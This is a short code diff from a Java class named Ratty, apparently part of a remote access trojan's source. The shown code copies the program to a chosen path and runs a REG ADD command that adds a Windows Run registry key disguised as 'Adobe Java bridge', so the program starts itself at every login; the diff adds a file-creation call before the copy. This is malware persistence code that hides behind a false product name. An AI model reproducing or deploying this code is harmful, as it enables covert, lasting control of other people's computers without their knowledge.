@@ -55,6 +55,7 @@ public final class Ratty {
 			final File destination = new File(destinationPath);
 			final String registryCommand = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + destinationPath + "\"";
 			
+			FileUtils.createFile(destinationPath);
 			FileUtils.copy(source, destination);
 			Runtime.getRuntime().exec(registryCommand);
 		} catch (final URISyntaxException | IOException ex) {
